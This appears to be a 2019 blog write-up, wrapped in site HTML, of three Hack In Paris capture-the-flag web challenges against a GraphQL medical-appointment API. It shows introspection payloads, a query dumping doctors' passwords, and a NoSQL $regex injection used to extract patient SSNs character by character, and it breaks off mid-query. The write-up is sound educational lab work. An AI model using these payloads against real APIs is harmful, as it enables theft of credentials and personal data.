@@ -1,0 +1,355 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola" />
+  <title>HIP19 Writeup - Meet Your Doctor 1,2,3 | Swissky's Lab</title>
+  <meta property="og:site_name" content="Swissky&apos;s Lab" />
+  <meta property="og:title" content="HIP19 Writeup - Meet Your Doctor 1,2,3" />
+  <meta name="description" content="Last wednesday I was in the Hack In Paris event for the 3rd time. As always there were some great conferences and challenges, and a new competition called &quot;Hacker Jeopardy&quot; which was very fun! During …" />
+  <meta property="og:description" content="Last wednesday I was in the Hack In Paris event for the 3rd time. As always there were some great conferences and challenges, and a new competition called &quot;Hacker Jeopardy&quot; which was very fun! During the Wargame I focused my time on Web challenges based on the graphql technology which was new to me,…" />
+  <meta property="og:url" content="https://swisskyrepo.github.io/blog/hip19-meetyourdoctor/" />
+  <link rel="canonical" href="https://swisskyrepo.github.io/blog/hip19-meetyourdoctor/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2019-06-22T00:00:00+00:00" />
+  <meta property="og:image" content="https://swisskyrepo.github.io/images/HIP19/hip19_wargame.png" />
+  <meta property="og:image:alt" content="HIP19 Writeup - Meet Your Doctor 1,2,3" />
+  <meta property="og:image:width" content="429" />
+  <meta property="og:image:height" content="300" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://swisskyrepo.github.io/atom.xml" title="Swissky&apos;s Lab | Atom" />
+  <link rel="alternate" type="application/rss+xml" href="https://swisskyrepo.github.io/rss.xml" title="Swissky&apos;s Lab | RSS" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://swisskyrepo.github.io/main.min.css?h=fc65ba308cf36d3ba82c" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://swisskyrepo.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://swisskyrepo.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://swisskyrepo.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://swisskyrepo.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://swisskyrepo.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://swisskyrepo.github.io/files/custom.css">
+
+<!-- HEAD END -->
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://swisskyrepo.github.io/" class="text-2xl font-semibold">Swissky&#x27;s Lab</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://swisskyrepo.github.io/elasticlunr.min.js", "https://swisskyrepo.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/projects"
+          >Projects</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/about"
+          >About</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">HIP19 Writeup - Meet Your Doctor 1,2,3</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2019-06-22T00:00:00+00:00">2019-06-22</time><span
+        class="mx-1">&middot;</span><time
+    datetime="PT0H4M0S">4&nbsp;min</time>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://swisskyrepo.github.io/images/HIP19/hip19_wargame.png"
+      alt="HIP19 Writeup - Meet Your Doctor 1,2,3"
+      width="429"
+      height="300"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/hip19-meetyourdoctor/#meet-your-doctor-1-100-pts">Meet your doctor 1 - 100 pts</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/hip19-meetyourdoctor/#meet-your-doctor-2-200-pts">Meet your doctor 2 - 200 pts</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/hip19-meetyourdoctor/#meet-your-doctor-3-300-pts">Meet your doctor 3 - 300 pts</a>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><p>Last wednesday I was in the Hack In Paris event for the 3rd time. As always there were some great conferences and challenges, and a new competition called "Hacker Jeopardy" which was very fun! During the Wargame I focused my time on Web challenges based on the <code>graphql</code> technology which was new to me, you will find below my writeups for the <code>Meet Your Doctor</code> challenges.</p>
+<p>![HIP Wargame 2019]({{ site.baseurl }}/images/HIP19/hip19_wargame.png "HIP Wargame 2019"){: .center-image }</p>
+<span id="continue-reading"></span>
+<h2 id="meet-your-doctor-1-100-pts">Meet your doctor 1 - 100 pts</h2>
+<p>URL: <code>http://meetyourdoctor1.challs.malice.fr</code><br />
+Goal : <code>Please help me find the Meet your doctor Admin password</code></p>
+<p>Gobuster revealed a <code>/graphql</code> endpoint at the root of the website, browsing <a href="http://meetyourdoctor1.challs.malice.fr/graphql">http://meetyourdoctor1.challs.malice.fr/graphql</a> gave us an access to an interactive GraphQL interpreter. On this page we can browse the documentation and <code>schema</code>.</p>
+<p>There, we can get the structure of the <code>Doctor</code> type.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>type Doctor {
+</span><span>  id: ID!
+</span><span>  firstName: String!
+</span><span>  lastName: String!
+</span><span>  specialty: String!
+</span><span>  patients: [Patient!]
+</span><span>  rendezvous: [Rendezvous!]
+</span><span>  email: String!
+</span><span>  password: String!
+</span><span>}
+</span></code></pre>
+<p>It seems we don't need to authenticate with the mutation <code>signIn</code> to query <code>Doctor</code> data.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>type Mutation {
+</span><span>  signIn(login: String!, password: String!): Token!
+</span><span>}
+</span></code></pre>
+<p>A simple query <code>{Doctors{id email password}}</code> was enough to extract all doctors' email and password. The flag was the password of the Admin doctor : <code>Now-_Let$|GetSeri0us</code></p>
+<p>![GraphQL UI]({{ site.baseurl }}/images/HIP19/doctors1graphql.png "GraphQL UI")</p>
+<h2 id="meet-your-doctor-2-200-pts">Meet your doctor 2 - 200 pts</h2>
+<p>URL: <code>http://meetyourdoctor2.challs.malice.fr</code><br />
+Goal: <code>I need to find the Patient 0 social security number! It is a matter of life and death</code></p>
+<p>In this challenge we didn't have access to an online "lab" to test and query the GraphQL. I made a tool to interact with the <code>/graphql</code> endpoint, it is open-source and available for free on <a href="https://github.com/swisskyrepo/GraphQLmap">Github: https://github.com/swisskyrepo/GraphQLmap</a>.</p>
+<p>Using <code>Introspection</code> we can still get the GraphQL schema, here is the URL-encoded version (Full version available at "<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">GraphQL Injection: enumerate-database-schema-via-introspection</a>").</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+</span><span style="color:#d08770;">true</span><span>)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+</span><span style="color:#d08770;">true</span><span>)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
+</span></code></pre>
+<p>It is strongly recommended to use <code>Firefox</code> to view the server response as it parses JSON an displays it nicely.</p>
+<p>![Doctors schema]({{ site.baseurl }}/images/HIP19/doctors2_schema.png "Doctors schema")</p>
+<p>Using GraphQLmap, we got the following structure.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>============= [SCHEMA] ===============
+</span><span style="color:#d08770;">e</span><span>.</span><span style="color:#d08770;">g</span><span>: name[Type]: arg (Type!)
+</span><span>
+</span><span>Query
+</span><span>        doctor[]: email (String!), 
+</span><span>        doctors[Doctor]: options (JSON!), 
+</span><span>        patients[Patient]: 
+</span><span>        patient[]: id (ID!), 
+</span><span>        allrendezvous[Rendezvous]: 
+</span><span>        rendezvous[]: id (ID!), 
+</span><span>Doctor
+</span><span>        id[ID]: 
+</span><span>        firstName[String]: 
+</span><span>        lastName[String]: 
+</span><span>        specialty[String]: 
+</span><span>        patients[None]: 
+</span><span>        rendezvous[None]: 
+</span><span>        email[String]: 
+</span><span>        password[String]: 
+</span><span>Patient
+</span><span>        id[ID]: 
+</span><span>        firstName[String]: 
+</span><span>        lastName[String]: 
+</span><span>        doctor[Doctor]: 
+</span><span>        ssn[String]: 
+</span><span>Rendezvous
+</span><span>        id[ID]: 
+</span><span>        </span><span style="color:#b48ead;">date</span><span>[String]: 
+</span><span>        confirmed[</span><span style="color:#b48ead;">Boolean</span><span>]: 
+</span><span>Mutation
+</span><span>        signIn[Token]: login (String!), password (String!), 
+</span><span>Token
+</span><span>        token[String]: 
+</span></code></pre>
+<p>In this case <code>Doctors</code> have an <code>options</code> parameter which accepts JSON. It allows us to specify items linked to the doctors' structure and project their data into the GraphQL response. I saw the following picture in a blog post, it helped me a lot to understand the structure of the query.</p>
+<p>![GraphMap]({{ site.baseurl }}/images/HIP19/graphmap.png "GraphMap")</p>
+<p>We can query <code>{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}</code>, don't forget to escape the <code>"</code> inside the <code>options</code>.</p>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>GraphQLmap&gt; {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: &quot;</span><span style="color:#a3be8c;">{</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">patients.ssn</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;"> :1}</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">patients{ssn</span><span>}}}
+</span><span>{
+</span><span>    &quot;</span><span style="color:#a3be8c;">firstName</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Admin</span><span>&quot;,
+</span><span>    &quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">5d089b25f48c29003191e3b5</span><span>&quot;,
+</span><span>    &quot;</span><span style="color:#a3be8c;">lastName</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Admin</span><span>&quot;,
+</span><span>    &quot;</span><span style="color:#a3be8c;">patients</span><span>&quot;: [
+</span><span>        {
+</span><span>            &quot;</span><span style="color:#a3be8c;">ssn</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">b16cff8b-4a5a-41c8-8545-d9880fd7aae5</span><span>&quot;
+</span><span>        }
+</span><span>    ]
+</span><span>} 
+</span></code></pre>
+<p>There we go, the second flag was <code>b16cff8b-4a5a-41c8-8545-d9880fd7aae5</code>.<br />
+An asciinema version is available at <a href="https://asciinema.org/a/sbqGXnWXl5Y6YeQr0wzsCzQli">https://asciinema.org/a/sbqGXnWXl5Y6YeQr0wzsCzQli</a></p>
+<h2 id="meet-your-doctor-3-300-pts">Meet your doctor 3 - 300 pts</h2>
+<p>URL: <code>http://meetyourdoctor3.challs.malice.fr</code><br />
+Goal: <code>I need to find the Patient 0 social security number! It is a matter of life and death</code></p>
+<p>Things are getting complicated, we can't dump the schema as the <code>Introspection</code> is set to false. Based on the previous challenge we can guess the structure is the same. Unfortunately we can't reuse the same query to extract the <code>ssn</code>, we get the following error.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">Field </span><span>&quot;</span><span style="color:#a3be8c;">doctors</span><span>&quot; argument &quot;</span><span style="color:#a3be8c;">search</span><span>&quot; of type &quot;</span><span style="color:#a3be8c;">JSON!</span><span>&quot; is required, but it was not provided.
+</span></code></pre>
+<p>This means there is a <code>search</code> argument in the doctor structure, something like <code>doctors[Doctor]: options (JSON!), search(JSON!)</code>.<br />
+Pete Correy explains how to exploit the search argument in his blog post <a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">GraphQL NoSQL Injection Through JSON Types</a>.</p>
+<p>Let's try a simple NoSQL injection with fields we know such as <code>lastName</code>.</p>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>OK: {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admi</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}
+</span><span>KO: {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admia</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}
+</span></code></pre>
+<p>Since the challenge I added a way to test the regex quickly in GraphQLmap using the <code>GRAPHQL_CHARSET</code> keyword inside a GraphQL query:</p>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>GraphQLmap &gt; {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">AdmiGRAPHQL_CHARSET</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}     
+</span><span>[</span><span style="background-color:#bf616a;color:#2b303b;">+</span><span>] Query: (</span><span style="color:#d08770;">45</span><span>) {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admi$</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}   
+</span><span>[</span><span style="background-color:#bf616a;color:#2b303b;">+</span><span>] Query: (</span><span style="color:#d08770;">45</span><span>) {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admi(</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}   
+</span><span>[</span><span style="background-color:#bf616a;color:#2b303b;">+</span><span>] Query: (</span><span style="color:#d08770;">45</span><span>) {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admi)</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}   
+</span><span>[</span><span style="background-color:#bf616a;color:#2b303b;">+</span><span>] Query: (</span><span style="color:#d08770;">206</span><span>) {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admi*</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}    
+</span><span>[</span><span style="background-color:#bf616a;color:#2b303b;">+</span><span>] Query: (</span><span style="color:#d08770;">45</span><span>) {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admi0</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}   
+</span><span>[</span><span style="background-color:#bf616a;color:#2b303b;">+</span><span>] Query: (</span><span style="color:#d08770;">45</span><span>) {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admi1</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}    
+</span><span>[</span><span style="background-color:#bf616a;color:#2b303b;">+</span><span>] Query: (</span><span style="color:#d08770;">206</span><span>) {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: </span><span style="color:#d08770;">1</span><span>, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admin</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">} }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span>}}
+</span></code></pre>
+<p>The injection worked, now we can re-use the payload from the challenge #2 and extract the <code>social security number</code> of the patient 0, which is the patient of the <code>Admin</code> doctor. The query was as follows, where we had to replace <code>CHARACTER_FROM_THE_FLAG</code> to test characters from the flag.</p>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{
+</span><span>  </span><span style="background-color:#bf616a;color:#2b303b;">doctors(</span><span>
+</span><span>    </span><span style="background-color:#bf616a;color:#2b303b;">options</span><span>: &quot;</span><span style="color:#a3be8c;">{</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">limit</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: 1, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">patients.ssn</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;"> :1}</span><span>&quot;, 
+</span><span>    </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">patients.ssn</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">^CHARACTER_FROM_THE_FLAG</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">}, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">:</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admin</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;"> }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">)</span><span>
+</span><span>    </span><span style="background-color:#bf616a;color:#2b303b;">{</span><span>
+</span><span>      </span><span style="background-color:#bf616a;color:#2b303b;">firstName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">lastName</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">id</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">patients{ssn</span><span>}
+</span><span>    }
